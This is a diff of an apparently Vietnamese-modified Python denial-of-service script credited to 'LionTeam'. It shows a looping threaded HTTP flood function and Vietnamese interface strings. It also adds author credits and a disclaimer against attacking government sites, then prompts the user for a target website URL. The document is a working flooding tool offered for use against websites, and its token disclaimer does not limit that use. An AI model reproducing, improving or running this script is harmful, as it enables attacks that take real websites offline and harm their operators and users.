@@ -6,30 +6,28 @@ def dos(target):
     while True:
         try:
             res = requests.get(target)
-            print("< / > Đang Attack < / >")
+            print("< / > Đang Tấn công mục tiêu chỉ định < / >")
         except requests.exceptions.ConnectionError:
-            print("[error] " + "Kế Nối Bị Lỗi")
+            print("[ERR] " + "Kết Nối Bị Lỗi")
  
-threads = 20
+threads = 10
 
 print("""
 
-           ▄▄                                                                                                     
-▀████▀     ██                     ███▀▀██▀▀███                                    ▀███▀▀▀██▄         ██           
-  ██                              █▀   ██   ▀█                                      ██    ██         ██           
-  ██     ▀███   ▄██▀██▄▀████████▄      ██      ▄▄█▀██ ▄█▀██▄ ▀████████▄█████▄       ██    ██ ▄▄█▀████████ ▄█▀██▄  
-  ██       ██  ██▀   ▀██ ██    ██      ██     ▄█▀   ███   ██   ██    ██    ██       ██▀▀▀█▄▄▄█▀   ██ ██  ██   ██  
-  ██     ▄ ██  ██     ██ ██    ██      ██     ██▀▀▀▀▀▀▄█████   ██    ██    ██       ██    ▀███▀▀▀▀▀▀ ██   ▄█████  
-  ██    ▄█ ██  ██▄   ▄██ ██    ██      ██     ██▄    ▄█   ██   ██    ██    ██       ██    ▄███▄    ▄ ██  ██   ██  
-██████████████▄ ▀█████▀▄████  ████▄  ▄████▄    ▀█████▀████▀██▄████  ████  ████▄   ▄████████  ▀█████▀ ▀████████▀██▄
+
                                                                                                                   
                                                                                                                   
-                                                                                                                  Version 1
+                                                                                                                  Bản 1.Việt hóa
 
 """)
 
-print('Copyright infringement : LionTeam Admin')
+print('BẢN QUYỀN THUỘC VỀ LIONTEAM')
+print('ADDONS BUFF STRONG BY GIAUY <3')
 print('Zalo : https://zalo.me/nhatquyendev ')
+print('FACEBOOK: LE THE GIA UY ')
+print('MOD NÀY KHÔNG THUỘC VỀ HTB & HTK ')
+print('KHÔNG ĐƯỢC ĐÁNH WEB CHÍNH PHỦ VÀ GOV! CHÚNG TÔI SẼ KHÔNG CHỊU TRÁCH NHIỆM CHO NHỮNG VIỆC BẠN ĐÃ LÀM ')
+print('THÂN ÁI GỬI CÁC PET ')
 url = input("Thêm URL Website (https//:nhatquyenit.net) >> ")
  
 try:
